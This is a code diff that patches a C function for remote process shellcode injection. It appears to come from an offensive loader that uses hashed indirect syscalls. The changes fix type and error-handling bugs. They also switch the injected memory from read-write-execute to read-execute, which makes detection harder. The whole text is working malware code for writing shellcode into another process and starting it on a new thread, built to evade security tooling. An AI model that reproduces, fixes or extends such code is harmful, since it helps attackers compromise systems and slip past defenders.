@@ -4,7 +4,7 @@
 BOOL RemoteProcessInjection(HANDLE hProcess, LPWSTR szProcessName, PBYTE pShellcode, SIZE_T sPayloadSize) {
     PVOID		pShellcodeAddress			= NULL;
 	SIZE_T		sOriginalSize				= sPayloadSize;
-	ULONG		sNumberOfBytesWritten		= 0;
+	SIZE_T		sNumberOfBytesWritten		= 0;
     DWORD		dwProcessId				    = 0;
 	DWORD		dwOldProtection				= 0;
 	NTSTATUS	status						= STATUS_SUCCESS;
@@ -73,13 +73,12 @@ BOOL RemoteProcessInjection(HANDLE hProcess, LPWSTR szProcessName, PBYTE pShellc
 	// Cleaning the buffer of the shellcode in the local process
 	// memset(pShellcode, '\0', sOriginalSize-1);
 	for (size_t i = 0; i < sOriginalSize; i++) {
-		printf("> %zu", i);
+		DebugPrint("> %zu", i);
 		((unsigned char *)pShellcode)[i] = 0;
 	}
 
 	// Setting memory permossions at pShellcodeAddress to be executable
 #ifdef HW_INDIRECT_SYSCALL
-	DebugPrint("[i] Changing Memory protection (syscall mode)...");
 	NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)PrepareSyscallHash(NtProtectVirtualMemory_JOAA);
     
     if (!pNtProtectVirtualMemory) {
@@ -87,7 +86,7 @@ BOOL RemoteProcessInjection(HANDLE hProcess, LPWSTR szProcessName, PBYTE pShellc
         return -2;
     }
 
-	status = pNtProtectVirtualMemory(hProcess, &pShellcodeAddress, (PULONG)&sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection);
+	status = pNtProtectVirtualMemory(hProcess, &pShellcodeAddress, &sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection);
     DebugPrint("[+] NtProtectVirtualMemory result: %d\n", status);
 
 	if (!NT_SUCCESS(status)) {
@@ -96,7 +95,7 @@ BOOL RemoteProcessInjection(HANDLE hProcess, LPWSTR szProcessName, PBYTE pShellc
 	}
 #else
 	DebugPrint("[i] Changing Memory protection...");
-	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
 		DebugPrint("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
@@ -111,7 +110,8 @@ BOOL RemoteProcessInjection(HANDLE hProcess, LPWSTR szProcessName, PBYTE pShellc
 		DebugPrint("[-] Failed to prepare syscall for NtCreateThreadEx.\n");
 		return -2; // Error code
 	}
-	if ((status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pShellcodeAddress, NULL, FALSE, 0, 0, 0, NULL)) || status == NULL) {
+	status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pShellcodeAddress, NULL, FALSE, 0, 0, 0, NULL);
+	if(!NT_SUCCESS(status)) {
 		DebugPrint("[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n", status);
 		return -1;
 	}
